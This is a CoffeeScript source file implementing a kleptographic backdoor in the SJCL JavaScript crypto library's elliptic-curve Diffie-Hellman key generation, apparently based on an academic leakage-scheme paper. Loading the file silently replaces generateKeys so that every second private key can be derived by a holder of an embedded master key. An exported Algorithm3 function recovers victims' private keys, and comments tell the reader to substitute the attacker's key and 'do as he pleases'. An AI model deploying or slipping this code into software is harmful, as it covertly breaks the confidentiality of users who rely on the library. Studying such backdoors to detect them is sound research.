# A back-door'ed Elliptic Curve Diffie-Hellman Exchange.
#
# This particular one is called a *strong (1, 2)-leakage scheme*.  *Only* the
# attacker and the honest participants in the protocol can recover the secret
# key.  The scheme is as secure as normal ECDH to any other party.
#
# '(1, 2)-leakage' denotes that the attacker can recover the secret key for 1
# out of every 2 exchanges, and 'strong' denotes that, even given white-box
# access to the back door's implementation, the outputs of a back-door'ed
# implementation and a true implementation are indistinguishable to all parties
# except the attacker.
#
# How to Use:  Include SJCL into the namespace and then include this file, which
#     will overwrite the relevant functions.  Continue as normal.
#
#     There's a function at the bottom that allows an attacker to extract the
#     private key for the second exchange, given the first.  The attacker can
#     then take the private key, derive the shared secret key, and do as he
#     pleases.
#
#
# http://paper.ijcsns.org/07_book/201006/20100623.pdf
sjcl = require './sjcl.js'

memory = null
sjcl.ecc.curves.c256.backdoor = hash: sjcl.hash.sha256.hash

# Master Key:  This should be changed to the attacker's public key.
sjcl.ecc.curves.c256.backdoor.masterKey = new sjcl.ecc.point(sjcl.ecc.curves.c256,
    new sjcl.bn.prime.p256('0x509405dc59cd109f4f3dc4d215f13662b0752248875ddab63b13a0582f9a10ae'),
    new sjcl.bn.prime.p256('0xab4593592953cad81ee1c3cf15f3104daa3f46977014763c57a70d61c8461dd5')
)

# Constants:  Change for extra effect.  a, b, h, e = sjcl.bn.random(curve.r)
sjcl.ecc.curves.c256.backdoor.const =
    a: new sjcl.bn.prime.p256('0x955fe12816bf0265cc9c7287995e9655346ed8fa3c82410151dc7d8c33862e98')
    b: new sjcl.bn.prime.p256('0x2ed1d9be1b6808a5c4dde8b6a0913cfac6854a4492fd693ad1ec780ef1f83e54')
    h: new sjcl.bn.prime.p256('0x595092ed1b1268090c8ccd4954bc5941472cdd7a37a1e7c705dd0c3d6e547e3a')
    e: new sjcl.bn.prime.p256('0x789d6450bd4e2afa90eee0ef817aca3729b73a6008f36c680bbd2fc01ff5882c')


sjcl.ecc.elGamal.generateKeys = (curve) ->
    out = null

    if typeof curve is "number"
        curve = sjcl.ecc.curves['c' + curve]

        if not curve? then throw new sjcl.exception.invalid "no such curve"

    if not memory? or not curve.backdoor?
        out = sjcl.ecc.basicKey.generateKeys('elGamal')(curve)
        if curve.backdoor? then memory = out.sec.B
    else
        [j, u] = [sjcl.bn.random(2), sjcl.bn.random(2)]

        acG = curve.G.mult(curve.backdoor.const.a).mult(memory)
        bcV = curve.backdoor.masterKey.mult(curve.backdoor.const.b).mult(memory)

        preSec = acG.toJac().add(bcV)

        if j.limbs[0] is 1
            hG = curve.G.mult(curve.backdoor.const.h)
            preSec = preSec.add(hG)

        if u.limbs[0] is 1
            eV = curve.backdoor.masterKey.mult(curve.backdoor.const.e)
            preSec = preSec.add(eV)

        sec = curve.backdoor.hash(preSec.toAffine().x.toBits())

        out = sjcl.ecc.basicKey.generateKeys('elGamal')(curve, undefined, sec)
        memory = null

    out


# Run by the attacker.  Finds the private key for the second public key, given
# two consecutive public keys.
#
# @param sjcl.ecc.curve             curve   Curve to use.
# @param sjcl.ecc.elGamal.secretKey privKey Attacker's private key.
# @param sjcl.ecc.elGamal.publicKey pubKey1 Victim's first public key.
# @param sjcl.ecc.elGamal.publicKey pubKey2 Victim's second public key.
#
# @return sjcl.ecc.elGamal.secretKey Victim's private key for pubKey2.
module.exports.Algorithm3 = (curve, privKey, pubKey1, pubKey2) ->
    pickle = (pubKey) ->
        pubKey = pubKey.get()
        pubKey.x.concat pubKey.y

    pointPickle = (point) -> sjcl.codec.hex.fromBits point.toBits()
    pointHash = (point) ->
        h = curve.backdoor.hash point.toAffine().x.toBits()
        newPoint = curve.G.mult h

        [h, newPoint]

    point1 = curve.fromBits pickle pubKey1
    point2 = pointPickle curve.fromBits pickle pubKey2
    privKey = curve.field.fromBits privKey.get()

    aM1  = point1.mult(curve.backdoor.const.a)
    bvM1 = point1.mult(curve.backdoor.const.b).mult(privKey)

    hG = curve.G.mult(curve.backdoor.const.h)
    eV = curve.G.mult(curve.backdoor.const.e).mult(privKey)


    Z1 = aM1.toJac().add(bvM1)
    [h, newZ1] = pointHash Z1

    if point2 is pointPickle newZ1 then return h

    Z2 = Z1.add(hG)
    [h, newZ2] = pointHash Z2

    if point2 is pointPickle newZ2 then return h

    Z3 = Z1.add(eV)
    [h, newZ3] = pointHash Z3

    if point2 is pointPickle newZ3 then return h

    Z4 = Z1.add(hG).add(eV)
    [h, newZ4] = pointHash Z4

    if point2 is pointPickle newZ4 then return h

    throw new sjcl.exception.invalid 'Back door didnt work.'
